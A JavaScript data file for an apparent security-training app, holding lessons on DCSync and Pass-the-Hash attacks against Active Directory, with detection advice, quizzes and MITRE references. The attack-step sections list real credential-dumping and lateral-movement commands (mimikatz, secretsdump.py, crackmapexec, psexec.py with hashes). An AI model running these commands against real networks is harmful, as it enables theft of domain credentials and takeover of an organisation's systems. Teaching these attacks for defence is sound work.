// client/src/data/theory/index.js

/**
 * Theory modules for interactive learning
 * Each module provides educational content before scenarios
 */

// Import all theory modules
import { kerberoastingTheory } from './kerberoasting';
import { asrepRoastingTheory } from './asrepRoasting';
import { bloodhoundTheory } from './bloodhound';
import { goldenTicketTheory } from './goldenTicket';

// You already have these from your original code
// Just keeping them as inline objects since they were already defined here
// If you want, you can also move these to separate files

export const theoryModules = {
  'kerberoasting': kerberoastingTheory,
  'asrep-roasting': asrepRoastingTheory,
  'bloodhound': bloodhoundTheory,
  'golden-ticket': goldenTicketTheory,
  
  // These can stay inline or be moved to separate files
  'dcsync': {
    id: 'dcsync',
    title: 'DCSync Attack Deep Dive',
    subtitle: 'Extract domain credentials like a Domain Controller',
    estimatedTime: '12 minutes',
    difficulty: 'Advanced',
    xpReward: 200,
    
    sections: [
      {
        id: 'intro',
        title: '🎯 What is DCSync?',
        type: 'intro',
        duration: '2 min',
        content: `DCSync is a powerful attack that allows an attacker to impersonate a Domain Controller and request password hashes for any user through the Directory Replication Service Remote Protocol (MS-DRSR).

**Critical Impact:** With DCSync, you can extract the krbtgt hash and create Golden Tickets for persistent domain admin access.`,
        
        keyPoints: [
          'Abuses legitimate AD replication protocol',
          'Extracts password hashes without touching LSASS',
          'Requires specific replication permissions',
          'Can extract krbtgt hash for Golden Ticket attacks'
        ]
      },
      
      {
        id: 'replication',
        title: '🔄 Active Directory Replication',
        type: 'concept',
        duration: '3 min',
        content: `Active Directory uses multi-master replication between Domain Controllers. DCSync exploits this legitimate mechanism.

**Normal Replication:** DCs replicate changes using the Directory Replication Service (DRS), including password hashes.

**The Attack:** An attacker with replication permissions can pretend to be a DC and request any object's data.`,
        
        example: {
          title: 'Required Permissions',
          code: `DS-Replication-Get-Changes (GUID: 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2)
DS-Replication-Get-Changes-All (GUID: 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2)

Default holders:
- Domain Admins
- Enterprise Admins
- Administrators
- Domain Controllers`
        }
      },
      
      {
        id: 'attack-steps',
        title: '⚔️ Executing DCSync',
        type: 'steps',
        duration: '4 min',
        content: 'Steps to perform a DCSync attack:',
        
        steps: [
          {
            number: 1,
            title: 'Verify Permissions',
            description: 'Check if compromised account has replication rights',
            commands: [
              'Get-DomainObjectAcl -SearchBase "DC=contoso,DC=local" -ResolveGUIDs'
            ]
          },
          {
            number: 2,
            title: 'Execute DCSync',
            description: 'Use Mimikatz or Impacket to perform replication',
            commands: [
              'mimikatz # lsadump::dcsync /domain:contoso.local /user:Administrator',
              'secretsdump.py contoso.local/user:password@dc01.contoso.local'
            ]
          },
          {
            number: 3,
            title: 'Extract Hashes',
            description: 'Receive NTLM and Kerberos hashes',
            commands: [
              'Use hashes for Pass-the-Hash attacks',
              'Create Golden Tickets with krbtgt hash'
            ]
          }
        ]
      },
      
      {
        id: 'defense',
        title: '🛡️ Detection & Mitigation',
        type: 'defensive',
        duration: '3 min',
        content: 'Detecting and preventing DCSync attacks.',
        
        detection: {
          logs: [
            'Event ID 4662: An operation was performed on an object',
            'Directory Service Access auditing must be enabled',
            'Monitor replication requests from non-DC computers'
          ],
          indicators: [
            'Event 4662 with Replication-Get-Changes GUIDs',
            'Replication requests from workstations',
            'Unusual accounts performing replication'
          ]
        },
        
        prevention: [
          {
            title: 'Limit Replication Permissions',
            description: 'Regularly audit who has replication rights',
            example: 'Remove unnecessary accounts from privileged groups'
          },
          {
            title: 'Protected Users Group',
            description: 'Add high-value accounts to Protected Users',
            example: 'Prevents NTLM hash replication for these users'
          },
          {
            title: 'Enable Advanced Auditing',
            description: 'Configure Directory Service Access auditing',
            example: 'auditpol /set /subcategory:"Directory Service Access" /success:enable'
          }
        ]
      }
    ],
    
    quiz: [
      {
        question: 'What protocol does DCSync abuse?',
        options: [
          'LDAP',
          'MS-DRSR (Directory Replication Service)',
          'SMB',
          'RPC'
        ],
        correct: 1,
        explanation: 'DCSync abuses the MS-DRSR protocol used for legitimate replication between Domain Controllers.'
      },
      {
        question: 'Which permission is NOT required for DCSync?',
        options: [
          'DS-Replication-Get-Changes',
          'DS-Replication-Get-Changes-All',
          'GenericAll on domain object',
          'Local Administrator on the DC'
        ],
        correct: 3,
        explanation: 'DCSync does not require local admin access to the DC, only the replication permissions.'
      }
    ],
    
    resources: [
      {
        title: 'MITRE ATT&CK - DCSync',
        url: 'https://attack.mitre.org/techniques/T1003/006/',
        type: 'reference'
      }
    ]
  },

  'pass-the-hash': {
    id: 'pass-the-hash',
    title: 'Pass-the-Hash Attack',
    subtitle: 'Authenticate without knowing the plaintext password',
    estimatedTime: '10 minutes',
    difficulty: 'Intermediate',
    xpReward: 120,
    
    sections: [
      {
        id: 'intro',
        title: '🎯 What is Pass-the-Hash?',
        type: 'intro',
        duration: '2 min',
        content: `Pass-the-Hash (PtH) is an attack where an attacker uses a password hash (usually NTLM) instead of the plaintext password to authenticate to remote systems.

**Key Insight:** Windows authentication protocols like NTLM don't require the plaintext password - the hash is sufficient!`,
        
        keyPoints: [
          'Uses password hash instead of plaintext password',
          'Works with NTLM authentication',
          'No need to crack the hash',
          'Common lateral movement technique'
        ]
      },
      
      {
        id: 'how-it-works',
        title: '🔐 How NTLM Authentication Works',
        type: 'concept',
        duration: '3 min',
        content: `NTLM authentication uses a challenge-response mechanism where the password hash (not plaintext) is used for authentication.

**The Vulnerability:** If you have the hash, you can authenticate without ever knowing the actual password.`,
        
        example: {
          title: 'NTLM Hash Format',
          code: `Username:RID:LM Hash:NTLM Hash
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0

The second hash (NTLM) is what we need for PtH attacks.`
        }
      },
      
      {
        id: 'attack-steps',
        title: '⚔️ Executing Pass-the-Hash',
        type: 'steps',
        duration: '3 min',
        
        steps: [
          {
            number: 1,
            title: 'Obtain Password Hash',
            description: 'Extract NTLM hash from compromised system',
            commands: [
              'mimikatz # sekurlsa::logonpasswords',
              'secretsdump.py user:password@target'
            ]
          },
          {
            number: 2,
            title: 'Use Hash for Authentication',
            description: 'Authenticate to remote systems using the hash',
            commands: [
              'mimikatz # sekurlsa::pth /user:admin /domain:contoso /ntlm:hash /run:cmd',
              'pth-winexe -U admin%hash //10.0.1.10 cmd'
            ]
          },
          {
            number: 3,
            title: 'Lateral Movement',
            description: 'Move to other systems using the compromised account',
            commands: [
              'crackmapexec smb 10.0.1.0/24 -u admin -H hash',
              'psexec.py -hashes :hash admin@10.0.1.10'
            ]
          }
        ]
      },
      
      {
        id: 'defense',
        title: '🛡️ Mitigation Strategies',
        type: 'defensive',
        duration: '2 min',
        
        prevention: [
          {
            title: 'Disable NTLM',
            description: 'Force Kerberos-only authentication',
            example: 'Network security: Restrict NTLM: Incoming NTLM traffic'
          },
          {
            title: 'Protected Users Group',
            description: 'Prevents NTLM for member accounts',
            example: 'Add privileged accounts to Protected Users'
          },
          {
            title: 'Credential Guard',
            description: 'Protects credentials using virtualization security',
            example: 'Enable on Windows 10/Server 2016+'
          }
        ]
      }
    ],
    
    quiz: [
      {
        question: 'What is required to perform Pass-the-Hash?',
        options: [
          'The plaintext password',
          'The NTLM hash',
          'A Kerberos ticket',
          'Domain Admin privileges'
        ],
        correct: 1,
        explanation: 'Pass-the-Hash only requires the NTLM hash, not the plaintext password.'
      }
    ],
    
    resources: [
      {
        title: 'MITRE ATT&CK - Pass the Hash',
        url: 'https://attack.mitre.org/techniques/T1550/002/',
        type: 'reference'
      }
    ]
  }
};

/**
 * Get theory module by scenario ID
 */
export const getTheoryModule = (scenarioId) => {
  return theoryModules[scenarioId] || null;
};

/**
 * Check if scenario has theory module
 */
export const hasTheoryModule = (scenarioId) => {
  return scenarioId in theory
